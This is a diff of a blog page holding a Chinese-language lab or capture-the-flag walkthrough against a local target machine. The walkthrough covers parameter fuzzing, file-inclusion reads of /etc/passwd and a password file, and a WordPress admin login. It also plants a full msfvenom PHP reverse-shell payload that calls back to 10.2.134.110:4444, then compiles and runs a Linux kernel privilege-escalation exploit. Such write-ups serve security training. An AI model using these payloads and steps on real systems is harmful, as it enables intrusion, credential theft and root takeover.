@@ -203,14 +203,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/Writeup/" style="color: #ffa2c4">
+                <a href="/tags/Writeup/" style="color: #00bcd4">
                     Writeup
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00a596">
+                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #ffa2c4">
                     网安
                 </a>
             </span>
@@ -237,7 +237,7 @@
 <p><img src="image-20250319171947542.png" alt="image-20250319171947542"></p>
 <p><img src="image-20250319172017421.png" alt="image-20250319172017421"></p>
 <p>secret.txt给了一个hint，需要我们fuzz一个php，找到参数把location.txt传进去。</p>
-<pre><code class="bash">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.23.156/index.php\?FUZZ
+<pre><code class="language-bash">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.23.156/index.php\?FUZZ
 </code></pre>
 <p>这段命令是使用 wfuzz 工具进行模糊测试（Fuzzing）的示例。wfuzz 是一个基于 Python 的网络模糊测试工具，用于发现 Web 应用程序中的漏洞，如注入漏洞、跨站脚本（XSS）等。下面是对命令的详细解释：</p>
 <ol>
@@ -251,11 +251,11 @@
 <p>fuzz出了file这个参数，把location.txt传进去。</p>
 <p><img src="image-20250319172248813.png" alt="image-20250319172248813"></p>
 <p>给了一个secrettier360参数，联想到前面还有image.php，我们把这个secrettier360传给它，并赋值为&#x2F;etc&#x2F;passwd</p>
-<pre><code class="bash">payload = http://192.168.23.156/image.php?secrettier360=/etc/passwd
+<pre><code class="language-bash">payload = http://192.168.23.156/image.php?secrettier360=/etc/passwd
 </code></pre>
 <p><img src="image-20250319172437447.png" alt="image-20250319172437447"></p>
 <p>提示去&#x2F;home&#x2F;saket&#x2F;目录下找一个password.txt文件，依旧利用这个参数。</p>
-<pre><code class="bash">payload = http://192.168.23.156/image.php?secrettier360=/home/saket/password.txt
+<pre><code class="language-bash">payload = http://192.168.23.156/image.php?secrettier360=/home/saket/password.txt
 </code></pre>
 <p><img src="image-20250319172611941.png" alt="image-20250319172611941"></p>
 <p>这个密码经测试，不是靶机中几个用户的密码。联想到靶机上运行着wordpress服务，猜测是wordpress上管理员账户的密码。</p>
@@ -263,15 +263,15 @@
 <p>只有一个用户，那就是他了。</p>
 <p>前面扫到了wp-login。我们进入<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-login">http://192.168.23.156/wordpress/wp-login</a> ，用victor作为用户名，前面获取的follow_the_ippsec为密码进行登录，成功登录。</p>
 <h3 id="渗透提权"><a href="#渗透提权" class="headerlink" title="渗透提权"></a>渗透提权</h3><p>在Appearance下Theme Editor下找到了secret.php这个可修改文件，我们用msfvenom做个马挂上去。</p>
-<pre><code class="bash">msfvenom -p php/meterpreter/reverse_tcp 
+<pre><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp 
 </code></pre>
-<pre><code class="php">&lt;?php /**/ error_reporting(0); $ip = &#39;10.2.134.110&#39;; $port = 4444; if (($f = &#39;stream_socket_client&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &#39;stream&#39;; &#125; if (!$s &amp;&amp; ($f = &#39;fsockopen&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &#39;stream&#39;; &#125; if (!$s &amp;&amp; ($f = &#39;socket_create&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &#39;socket&#39;; &#125; if (!$s_type) &#123; die(&#39;no socket funcs&#39;); &#125; if (!$s) &#123; die(&#39;no socket&#39;); &#125; switch ($s_type) &#123; case &#39;stream&#39;: $len = fread($s, 4); break; case &#39;socket&#39;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&#39;len&#39;]; $b = &#39;&#39;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &#39;stream&#39;: $b .= fread($s, $len-strlen($b)); break; case &#39;socket&#39;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&#39;msgsock&#39;] = $s; $GLOBALS[&#39;msgsock_type&#39;] = $s_type; if (extension_loaded(&#39;suhosin&#39;) &amp;&amp; ini_get(&#39;suhosin.executor.disable_eval&#39;)) &#123; $suhosin_bypass=create_function(&#39;&#39;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();
+<pre><code class="language-php">&lt;?php /**/ error_reporting(0); $ip = &#39;10.2.134.110&#39;; $port = 4444; if (($f = &#39;stream_socket_client&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &#39;stream&#39;; &#125; if (!$s &amp;&amp; ($f = &#39;fsockopen&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &#39;stream&#39;; &#125; if (!$s &amp;&amp; ($f = &#39;socket_create&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &#39;socket&#39;; &#125; if (!$s_type) &#123; die(&#39;no socket funcs&#39;); &#125; if (!$s) &#123; die(&#39;no socket&#39;); &#125; switch ($s_type) &#123; case &#39;stream&#39;: $len = fread($s, 4); break; case &#39;socket&#39;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&#39;len&#39;]; $b = &#39;&#39;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &#39;stream&#39;: $b .= fread($s, $len-strlen($b)); break; case &#39;socket&#39;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&#39;msgsock&#39;] = $s; $GLOBALS[&#39;msgsock_type&#39;] = $s_type; if (extension_loaded(&#39;suhosin&#39;) &amp;&amp; ini_get(&#39;suhosin.executor.disable_eval&#39;)) &#123; $suhosin_bypass=create_function(&#39;&#39;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();
 </code></pre>
 <p>这个马的原理是：在访问php文件时，服务器会执行secret.php中的php代码。这是建立连接的关键，所以需要把控一下顺序：先打开msfconsole进行监听，然后再访问挂马的网页。</p>
 <p>secret.php的位置在哪里？前面dirb扫描目录的时候扫描到了“<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/">http://192.168.23.156/wordpress/wp-content/themes/</a> ” 这个目录，那就是在这里了。为什么？</p>
 <p>一般情况下，themes目录存放着wordpress的主题文件，文件夹名一般为主题名。secret.php显然在twentynineteen里，那我们就访问这个目录下的secret.php。</p>
 <p>kali上，msfconsole提前准备好。</p>
-<pre><code class="bash">use exploit/multi/handler
+<pre><code class="language-bash">use exploit/multi/handler
 set LHOST 172.19.15.230
 set payload php/meterpreter/reverse_tcp
 run
@@ -279,7 +279,7 @@ run
 <p>然后访问<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php</a> </p>
 <p><img src="image-20250319173351806.png" alt="image-20250319173351806"></p>
 <p>成功连接。系统是ubuntu 16.04，我们需要找一个适用的exp。</p>
-<pre><code class="bash">searchsploit 16.04 ubuntu
+<pre><code class="language-bash">searchsploit 16.04 ubuntu
 
 Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c
 
@@ -288,12 +288,12 @@ find /usr -name 45010.c
 /usr/share/exploitdb/exploits/linux/local/45010.c
 </code></pre>
 <p>gcc编译一下，由于本机环境glibc版本过高，加上-static参数进行静态编译，把所有依赖库全部打包编译进去防止依赖报错。</p>
-<pre><code class="bash">gcc /usr/share/exploitdb/exploits/linux/local/45010.c -o 45010 -static
+<pre><code class="language-bash">gcc /usr/share/exploitdb/exploits/linux/local/45010.c -o 45010 -static
 </code></pre>
 <p>msfconsole那边，把exp upload上去。</p>
 <p><code>upload ~/45010 /tmp/45010</code></p>
 <p>然后开个shell</p>
-<pre><code class="bash">shell
+<pre><code class="language-bash">shell
 cd /tmp
 chmod +x 45010
 ./45010
